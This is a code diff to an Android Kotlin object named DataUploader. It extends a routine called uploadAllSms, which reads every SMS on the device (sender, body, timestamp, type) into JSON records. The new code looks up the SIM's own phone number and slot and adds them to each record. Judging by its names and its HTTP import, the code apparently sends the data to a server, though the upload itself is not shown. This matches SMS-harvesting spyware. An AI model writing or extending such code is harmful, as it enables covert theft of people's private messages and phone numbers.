@@ -1,10 +1,13 @@
 package com.example.test.utils
 
 import android.content.Context
+import android.os.Build
 import android.util.Log
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.database.Cursor
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -111,12 +114,71 @@ object DataUploader {
         }
     }
 
+    private fun getSimInfoFromSubId(context: Context, subId: Int?): Pair<String, Int> {
+        if (subId == null || subId < 0) return Pair("", -1)
+        
+        try {
+            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+            if (subManager == null) return Pair("", -1)
+            
+            val activeSubscriptions = subManager.activeSubscriptionInfoList
+            if (activeSubscriptions.isNullOrEmpty()) return Pair("", -1)
+            
+            val subscriptionInfo = activeSubscriptions.find { it.subscriptionId == subId }
+            if (subscriptionInfo == null) return Pair("", -1)
+            
+            val simSlot = subscriptionInfo.simSlotIndex
+            var phoneNumber = subscriptionInfo.number ?: ""
+            
+            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                    if (telephonyManager != null) {
+                        val tm = telephonyManager.createForSubscriptionId(subId)
+                        phoneNumber = tm.line1Number ?: ""
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to get line1Number for subId $subId: ${e.message}")
+                }
+            }
+            
+            return Pair(phoneNumber, simSlot)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting SIM info: ${e.message}")
+            return Pair("", -1)
+        }
+    }
+    
     fun uploadAllSms(context: Context, deviceId: String) {
         try {
             val messages = JSONArray()
+            
+            val columns = mutableListOf(
+                Telephony.Sms.ADDRESS,
+                Telephony.Sms.BODY,
+                Telephony.Sms.DATE,
+                Telephony.Sms.TYPE
+            )
+            
+            val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                try {
+                    val testCursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf("sub_id"), null, null, null)
+                    testCursor?.use {
+                        if (it.columnCount > 0) {
+                            columns.add("sub_id")
+                        }
+                    }
+                    "sub_id"
+                } catch (e: Exception) {
+                    null
+                }
+            } else null
+            
             val cursor: Cursor? = context.contentResolver.query(
                 Telephony.Sms.CONTENT_URI,
-                null, null, null,
+                columns.toTypedArray(),
+                null,
+                null,
                 Telephony.Sms.DATE + " DESC"
             )
 
@@ -125,12 +187,44 @@ object DataUploader {
                 val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                 val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                 val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
+                val subIdIndex = if (subIdColumn != null) {
+                    try {
+                        val idx = it.getColumnIndex(subIdColumn)
+                        if (idx >= 0) idx else -1
+                    } catch (e: Exception) {
+                        -1
+                    }
+                } else -1
 
                 while (it.moveToNext()) {
                     val address = it.getString(addressIndex) ?: ""
                     val body = it.getString(bodyIndex) ?: ""
                     val timestamp = it.getLong(dateIndex)
                     val smsType = it.getInt(typeIndex)
+                    
+                    var subId: Int? = null
+                    if (subIdIndex >= 0) {
+                        try {
+                            val subIdValue = it.getInt(subIdIndex)
+                            if (subIdValue >= 0) {
+                                subId = subIdValue
+                            }
+                        } catch (e: Exception) {
+                            try {
+                                val subIdValue = it.getString(subIdIndex)
+                                if (!subIdValue.isNullOrBlank()) {
+                                    subId = subIdValue.toIntOrNull()
+                                }
+                            } catch (e2: Exception) {
+                            }
+                        }
+                    }
+                    
+                    val (simPhoneNumber, simSlot) = if (subId != null && subId >= 0) {
+                        getSimInfoFromSubId(context, subId)
+                    } else {
+                        Pair("", -1)
+                    }
 
                     val (from, to) = when (smsType) {
                         Telephony.Sms.MESSAGE_TYPE_INBOX -> Pair(address, deviceId)
@@ -154,6 +248,12 @@ object DataUploader {
                         put("body", body)
                         put("timestamp", timestamp)
                         put("type", typeStr)
+                        if (simPhoneNumber.isNotEmpty()) {
+                            put("sim_phone_number", simPhoneNumber)
+                        }
+                        if (simSlot >= 0) {
+                            put("sim_slot", simSlot)
+                        }
                     }
                     messages.put(sms)
                 }
